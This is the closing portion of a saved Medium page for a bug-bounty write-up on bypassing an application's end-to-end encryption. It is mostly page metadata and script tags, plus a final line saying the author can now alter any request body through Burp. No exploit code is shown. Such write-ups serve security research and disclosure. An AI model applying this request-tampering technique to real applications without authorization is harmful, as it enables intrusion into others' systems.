API","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*Fq7LVrtbh4sRS4tzbdKe_g.png":{"__typename":"ImageMetadata","id":"1*Fq7LVrtbh4sRS4tzbdKe_g.png","originalHeight":712,"originalWidth":1621,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_85":{"__typename":"Paragraph","id":"449009ef02f6_85","name":"ca1e","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Fq7LVrtbh4sRS4tzbdKe_g.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*wyLU0kqRTJSWMMIQCQooUg.png":{"__typename":"ImageMetadata","id":"1*wyLU0kqRTJSWMMIQCQooUg.png","originalHeight":790,"originalWidth":1678,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_86":{"__typename":"Paragraph","id":"449009ef02f6_86","name":"203f","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*wyLU0kqRTJSWMMIQCQooUg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_87":{"__typename":"Paragraph","id":"449009ef02f6_87","name":"5d82","type":"P","href":null,"layout":null,"metadata":null,"text":"Now I control any request body sent to the application just by editing it via burp.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_88":{"__typename":"Paragraph","id":"449009ef02f6_88","name":"8414","type":"P","href":null,"layout":null,"metadata":null,"text":"That’s all for this blog, I hope you enjoyed reading and I will be pleased if you have any feedback!","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":91,"end":99,"href":"https:\u002F\u002Ftwitter.com\u002Fmelotover","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"UserViewerEdge:userId:d906f948337c-viewerId:lo_3e69870ddef7":{"__typename":"UserViewerEdge","id":"userId:d906f948337c-viewerId:lo_3e69870ddef7","isMuting":false},"PostViewerEdge:postId:65b708e5ad84-viewerId:lo_3e69870ddef7":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:65b708e5ad84-viewerId:lo_3e69870ddef7"},"Tag:javascript-obfuscate":{"__typename":"Tag","id":"javascript-obfuscate","displayTitle":"Javascript Obfuscate","normalizedTagSlug":"javascript-obfuscate"},"Tag:bugbounty-writeup":{"__typename":"Tag","id":"bugbounty-writeup","displayTitle":"Bugbounty Writeup","normalizedTagSlug":"bugbounty-writeup"},"Tag:ssrf":{"__typename":"Tag","id":"ssrf","displayTitle":"Ssrf","normalizedTagSlug":"ssrf"},"Tag:idor":{"__typename":"Tag","id":"idor","displayTitle":"Idor","normalizedTagSlug":"idor"},"Tag:encryption-security":{"__typename":"Tag","id":"encryption-security","displayTitle":"Encryption Security","normalizedTagSlug":"encryption-security"},"Post:65b708e5ad84":{"__typename":"Post","id":"65b708e5ad84","collection":null,"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"76a3","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"d46c","startIndex":18,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"bc3f","startIndex":47,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"89ad","startIndex":54,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"6a69","startIndex":63,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:449009ef02f6_0"},{"__ref":"Paragraph:449009ef02f6_1"},{"__ref":"Paragraph:449009ef02f6_2"},{"__ref":"Paragraph:449009ef02f6_3"},{"__ref":"Paragraph:449009ef02f6_4"},{"__ref":"Paragraph:449009ef02f6_5"},{"__ref":"Paragraph:449009ef02f6_6"},{"__ref":"Paragraph:449009ef02f6_7"},{"__ref":"Paragraph:449009ef02f6_8"},{"__ref":"Paragraph:449009ef02f6_9"},{"__ref":"Paragraph:449009ef02f6_10"},{"__ref":"Paragraph:449009ef02f6_11"},{"__ref":"Paragraph:449009ef02f6_12"},{"__ref":"Paragraph:449009ef02f6_13"},{"__ref":"Paragraph:449009ef02f6_14"},{"__ref":"Paragraph:449009ef02f6_15"},{"__ref":"Paragraph:449009ef02f6_16"},{"__ref":"Paragraph:449009ef02f6_17"},{"__ref":"Paragraph:449009ef02f6_18"},{"__ref":"Paragraph:449009ef02f6_19"},{"__ref":"Paragraph:449009ef02f6_20"},{"__ref":"Paragraph:449009ef02f6_21"},{"__ref":"Paragraph:449009ef02f6_22"},{"__ref":"Paragraph:449009ef02f6_23"},{"__ref":"Paragraph:449009ef02f6_24"},{"__ref":"Paragraph:449009ef02f6_25"},{"__ref":"Paragraph:449009ef02f6_26"},{"__ref":"Paragraph:449009ef02f6_27"},{"__ref":"Paragraph:449009ef02f6_28"},{"__ref":"Paragraph:449009ef02f6_29"},{"__ref":"Paragraph:449009ef02f6_30"},{"__ref":"Paragraph:449009ef02f6_31"},{"__ref":"Paragraph:449009ef02f6_32"},{"__ref":"Paragraph:449009ef02f6_33"},{"__ref":"Paragraph:449009ef02f6_34"},{"__ref":"Paragraph:449009ef02f6_35"},{"__ref":"Paragraph:449009ef02f6_36"},{"__ref":"Paragraph:449009ef02f6_37"},{"__ref":"Paragraph:449009ef02f6_38"},{"__ref":"Paragraph:449009ef02f6_39"},{"__ref":"Paragraph:449009ef02f6_40"},{"__ref":"Paragraph:449009ef02f6_41"},{"__ref":"Paragraph:449009ef02f6_42"},{"__ref":"Paragraph:449009ef02f6_43"},{"__ref":"Paragraph:449009ef02f6_44"},{"__ref":"Paragraph:449009ef02f6_45"},{"__ref":"Paragraph:449009ef02f6_46"},{"__ref":"Paragraph:449009ef02f6_47"},{"__ref":"Paragraph:449009ef02f6_48"},{"__ref":"Paragraph:449009ef02f6_49"},{"__ref":"Paragraph:449009ef02f6_50"},{"__ref":"Paragraph:449009ef02f6_51"},{"__ref":"Paragraph:449009ef02f6_52"},{"__ref":"Paragraph:449009ef02f6_53"},{"__ref":"Paragraph:449009ef02f6_54"},{"__ref":"Paragraph:449009ef02f6_55"},{"__ref":"Paragraph:449009ef02f6_56"},{"__ref":"Paragraph:449009ef02f6_57"},{"__ref":"Paragraph:449009ef02f6_58"},{"__ref":"Paragraph:449009ef02f6_59"},{"__ref":"Paragraph:449009ef02f6_60"},{"__ref":"Paragraph:449009ef02f6_61"},{"__ref":"Paragraph:449009ef02f6_62"},{"__ref":"Paragraph:449009ef02f6_63"},{"__ref":"Paragraph:449009ef02f6_64"},{"__ref":"Paragraph:449009ef02f6_65"},{"__ref":"Paragraph:449009ef02f6_66"},{"__ref":"Paragraph:449009ef02f6_67"},{"__ref":"Paragraph:449009ef02f6_68"},{"__ref":"Paragraph:449009ef02f6_69"},{"__ref":"Paragraph:449009ef02f6_70"},{"__ref":"Paragraph:449009ef02f6_71"},{"__ref":"Paragraph:449009ef02f6_72"},{"__ref":"Paragraph:449009ef02f6_73"},{"__ref":"Paragraph:449009ef02f6_74"},{"__ref":"Paragraph:449009ef02f6_75"},{"__ref":"Paragraph:449009ef02f6_76"},{"__ref":"Paragraph:449009ef02f6_77"},{"__ref":"Paragraph:449009ef02f6_78"},{"__ref":"Paragraph:449009ef02f6_79"},{"__ref":"Paragraph:449009ef02f6_80"},{"__ref":"Paragraph:449009ef02f6_81"},{"__ref":"Paragraph:449009ef02f6_82"},{"__ref":"Paragraph:449009ef02f6_83"},{"__ref":"Paragraph:449009ef02f6_84"},{"__ref":"Paragraph:449009ef02f6_85"},{"__ref":"Paragraph:449009ef02f6_86"},{"__ref":"Paragraph:449009ef02f6_87"},{"__ref":"Paragraph:449009ef02f6_88"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:d906f948337c"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fmelotover.medium.com\u002Fbypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"cybersecurity"}],"isPublished":true,"latestPublishedVersion":"449009ef02f6","visibility":"PUBLIC","postResponses":{"__typename":"PostResponses","count":10},"clapCount":624,"allowResponses":true,"isLimitedState":false,"title":"Bypassing E2E encryption leads to multiple high vulnerabilities.","isSeries":false,"sequence":null,"uniqueSlug":"bypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1674241956316,"readingTime":8.000943396226415,"previewContent":{"__typename":"PreviewContent","subtitle":"In today’s blog, I’m going to show you how I was able to bypass the E2E encryption of an application by analyzing an obfuscated javascript…"},"previewImage":{"__ref":"ImageMetadata:1*eeiaLlmgBLPYzTIIySTjTg.png"},"isShortform":false,"seoTitle":"","firstPublishedAt":1674241956316,"updatedAt":1675525240425,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","viewerEdge":{"__ref":"PostViewerEdge:postId:65b708e5ad84-viewerId:lo_3e69870ddef7"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:javascript-obfuscate"},{"__ref":"Tag:bugbounty-writeup"},{"__ref":"Tag:ssrf"},{"__ref":"Tag:idor"},{"__ref":"Tag:encryption-security"}],"isNewsletter":false,"statusForCollection":null,"pendingCollection":null,"detectedLanguage":"en","wordCount":1630,"layerCake":6,"responsesLocked":false}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"HIT"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.1b75cd39.js"></script><script src="https://cdn-client.medium.com/lite/static/js/9865.1496d74a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.bc924586.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.d9108df7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4810.6318add7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2707.a4e221ac.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.933c1c9a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8599.73cb8339.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5250.9f9e01d2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8346.be5bef41.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2648.26563adf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8393.826a25fb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4863.28ab43f6.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6589.ab860fa4.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5642.0f82ef97.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6546.7c45541d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.8aa8d357.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4492.3e85e9f5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/839.1c286b32.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3259.1779fbde.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.60bcefe8.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7394.ca29bb88.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5794.9e8ff5dd.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8204.e2639348.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4391.59acaed3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.111f755f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8414.6565ad5f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3974.8d3e0217.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2527.21406717.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostResponsesContent.0eb77899.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/responses.editor.5a11f4da.chunk.js"></script><script>window.main();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9003378b287a7f59',t:'MTczNjU4MDc4OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body></html>